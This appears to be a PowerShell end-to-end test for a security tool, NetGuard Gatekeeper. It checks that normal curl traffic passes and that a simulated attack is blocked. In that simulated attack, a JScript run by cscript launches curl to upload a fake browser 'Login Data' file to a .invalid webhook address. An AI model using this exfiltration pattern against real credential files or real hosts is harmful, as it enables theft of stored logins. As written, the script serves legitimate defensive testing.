<#
End-to-end check of an installed NetGuard Gatekeeper. Run as your normal user (not elevated).
  1. Normal use: curl started from this shell must go through, with its exit code intact.
  2. Simulated attack: a Windows script runner (cscript) starts curl to upload a fake
     "Login Data" file to a webhook address. The Gatekeeper must hold it and block it.
     The warning window appears; in self-test mode it blocks by itself after 8 seconds.
     The URL uses the reserved .invalid domain, so nothing can be sent even if you click Allow.
#>
$ErrorActionPreference = 'Stop'
$log = 'C:\ProgramData\NetGuard\gate.log'
if (-not (Get-Process gatekeeper -ErrorAction SilentlyContinue)) { throw 'Gatekeeper is not running - install NetGuard first.' }
$fail = 0

# 1. normal use
$t = Measure-Command { $code = curl.exe -s -o NUL -w '%{http_code}' --max-time 10 https://www.example.com }
if ($LASTEXITCODE -eq 0 -and $code -eq '200') { "PASS  normal curl went through (HTTP 200, $([math]::Round($t.TotalMilliseconds)) ms)" }
else { "FAIL  normal curl: exit $LASTEXITCODE, HTTP $code"; $fail++ }

# 2. simulated attack
$dir = Join-Path $env:TEMP ("netguard-test-" + [guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Path $dir | Out-Null
try {
  Set-Content (Join-Path $dir 'Login Data') 'fake test file'
  $js = Join-Path $dir 'attack.js'
  $target = (Join-Path $dir 'Login Data').Replace('\', '\\')
  Set-Content $js @"
var sh = new ActiveXObject('WScript.Shell');
WScript.Quit(sh.Run('curl.exe -s --max-time 5 -F "f=@$target" https://webhook.site.invalid/NETGUARD-SELFTEST', 0, true));
"@
  $before = if (Test-Path $log) { (Get-Content $log).Count } else { 0 }
  & cscript.exe //nologo $js
  $exit = $LASTEXITCODE
  $new = if (Test-Path $log) { Get-Content $log | Select-Object -Skip $before } else { @() }
  $blocked = $new | Where-Object { $_ -match 'BLOCKED' -and $_ -match 'NETGUARD-SELFTEST' }
  if ($blocked -and $exit -ne 0) { "PASS  simulated attack was held and blocked before curl ran"; $blocked | ForEach-Object { "      " + ($_ -replace '.*why: ', 'why: ') } }
  else { "FAIL  simulated attack was not blocked (curl exit $exit)"; $fail++ }
}
finally { Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue }

if ($fail) { "`n$fail test(s) failed"; exit 1 } else { "`nall tests passed"; exit 0 }
